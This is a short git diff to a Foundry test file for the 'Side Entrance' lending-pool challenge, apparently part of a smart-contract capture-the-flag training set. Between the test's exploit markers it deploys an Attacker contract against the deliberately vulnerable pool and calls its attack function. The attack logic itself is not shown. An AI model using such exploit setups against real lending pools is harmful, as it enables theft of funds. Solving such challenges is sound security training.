@@ -5,12 +5,14 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {Attacker} from "../../../src/Contracts/side-entrance/Attacker.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
     Utilities internal utils;
     SideEntranceLenderPool internal sideEntranceLenderPool;
+    Attacker internal attackerContract;
     address payable internal attacker;
     uint256 public attackerInitialEthBalance;
 
@@ -36,7 +38,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        attackerContract = new Attacker(address(sideEntranceLenderPool));
+        attackerContract.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
